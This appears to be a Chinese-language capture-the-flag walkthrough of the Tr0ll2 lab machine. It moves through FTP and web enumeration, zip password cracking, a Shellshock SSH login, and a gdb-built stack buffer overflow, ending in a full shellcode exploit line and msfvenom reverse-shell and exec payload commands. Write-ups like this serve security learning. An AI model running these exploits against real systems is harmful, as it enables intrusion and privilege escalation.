## 信息收集

```````
sudo arp-scan -l 扫描开放的新主机
```````

[利用自己编写的简易脚本(只是简化了操作步骤)扫描目标靶机](https://github.com/defu0117/CODE/blob/main/shell/scan_simple.sh)

```
输出到的ports开放端口21,22,80
detail 输出了80web端存在robots.txt
ftp 没有显示能匿名登录
```



## FTP渗透

- 首先还是尝试了一下能不能匿名登录，发现不能
- 这时候思路转到web，访问页面是一个图片，dump下来也没有发现有用信息
- 页面源码显示作者是:Tr0ll,看看能不能弱密码登录ftp，尝试成功，下载lmao.zip



### WEB渗透

- robots.txt显示内容:

  ```
  User-agent:*
  Disallow:
  /noob
  /nope
  /try_harder
  /keep_trying
  /isnt_this_annoying
  /nothing_here
  /404
  /LOL_at_the_last_one
  /trolling_is_fun
  /zomg_is_this_it
  /you_found_me
  /I_know_this_sucks
  /You_could_give_up
  /dont_bother
  /will_it_ever_end
  /I_hope_you_scripted_this
  /ok_this_is_it
  /stop_whining
  /why_are_you_still_looking
  /just_quit
  /seriously_stop
  ```

  提示我们也是要不要写个脚本访问，咱毕竟也是个懒人，不可能挨个访问的

  **script:**

  ```bash
  #!/bin/bash
  
  while read line
  do
          ur="http://192.168.1.93${line}"
          echo `curl -L -s ${ur}` && echo "${line}" 
  done < url
  ```

  

  ```shell
  bash sh | grep -v "404" 输出了四个文件有显示，但都是图片，我开始没有挨个看，血亏啊，转了半天发现没有思路，结果发现在/dont_bother/下的图片源码显示了新的路径
  
  Look Deep within y0ur_self for the answer
  /y0ur_self/answer.txt 下是base64 encode的密码本
  base64 -d answer.txt > passwd
  
  使用fcracekzip 破解zip文件
  fcrackzip -D -p passwd -u lmao.zip
  -D 使用暴力破解模式
  -p指定密码路径
  -u指定文件路径
  
  PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
  
  ```



## 提权

- zip解压得到一个私钥文件

- 将权限改为600,但是不知道用户名称是什么，我尝试直接使用加压出来的文件名，因为在之前也出现过noob

- ```shell
  ssh -i noob@192.168.1.93
  
  TRY HARDER LOL!
  Connection to 192.168.1.93 closed.
  
  这里我不知道怎么做了，没有思路，于是看了大佬的wp发现是shellshock
  
  ssh -i noob@192.168.1.93 -i noob -t '() { :;}; /bin/bash'
  -t  远程登录后执行的内容
  这里好像是有个源文件会将检查到的(){ 认为是函数，倘若该环境变量字符串包含多个用分号；隔开的shell命令，parse_and_execute函数会执行每一条命令，具体我也不太清楚
  ```

  - 登录到系统发现系统其他用户，除了noob还有一个，home下目录有可读权限但是没什么信息

  - `find / -perm -u=s -type f 2>/dev/null | grep -v "proc"`

    /nothing_to_see_here/choose_wisely/door2/r00t
    /nothing_to_see_here/choose_wisely/door3/r00t
    /nothing_to_see_here/choose_wisely/door1/r00t

  - 发现有可读可执行权限，三个文件会互相改换位置，一个可以输入靶机名称，一个重启，一个说开启两分钟困难模式，不能使用ls了



### 缓冲区溢出提权

- 在可输入的可执行文件查看源码，首先strings我们没有权限使用了
- 我们使用od -S 1 r001     | -S 1 查看可打印字符
- 发现展示了之前在.bash_history出现过的bof.c还有strcpy

​	` char *strcpy(char *dest, const char *src) 把src所指向的字符串复制到dest，如果dest不够大容易造成缓冲区溢出漏洞`

系统还有gdb和windows的Immunity Debugger一样可以调试文件

```
r(run) 运行知道中断了后面跟一个参数

1.模糊测试看多少发生溢出:
r $(python -c 'print "A"*500')   最后发现在200没有溢出，300溢出了

2.具体测试出在多少位溢出
用msf的生成出300位测试码
msf-pattern_create -l 300

r $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')

:Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()

msf-pattern_offset -l 300 -q 0x6a413969
[*] Exact match at offset 268


3.那么第269位就是溢出的，我们看看后面的内容在哪个地方
r $(python -c 'print "A"*268 + "B"*4 + "C"*8')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A"*268 + "B"*4 + "C"*8')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x118    280
ecx            0x0      0
edx            0x0      0
ebx            0xb7fd1ff4       -1208147980
esp            0xbffffb60       0xbffffb60
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

0xbffffb60 的内容就是CCCC可以使用查看内容
x/100xb 0xbffffb60
0xbffffb60:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43


4.查看坏字符，用github的开源程序生成一个码./badchars ，/x01~/xff
输入，如果x/100xb 0xbffffb60后面的内容挨个对不上就在此位置出现坏字符，剔除然后重新运行     最后得到的坏字符位/x09,/x0a,/x20以及/x00

5.生成payload
msvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.93 LPORT=4444 -b '\x00\x0a\x0d' -f py 但是没有运行成功 最开始还使用了-e x86/shikata_ga_nai

msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86

最后输入:
./r00t $(python -c "print 'A' * 268 + '\x80\xfb\xff\xbf' + '\x90' * 100 + '\xd9\xee\xd9\x74\x24\xf4\x5f\xba\x2e\x56\xb2\x8d\x33\xc9\xb1\x0b\x31\x57\x1a\x03\x57\x1a\x83\xc7\x04\xe2\xdb\x3c\xb9\xd5\xba\x93\xdb\x8d\x91\x70\xad\xa9\x81\x59\xde\x5d\x51\xce\x0f\xfc\x38\x60\xd9\xe3\xe8\x94\xd1\xe3\x0c\x65\xcd\x81\x65\x0b\x3e\x35\x1d\xd3\x17\xea\x54\x32\x5a\x8c'")
提权成功

/x90 *100 是nop sled 位,nop滑动，给出更大的空间去提高容错率，因为有的shellcode会先生成一段加载的代码，防止覆盖
```



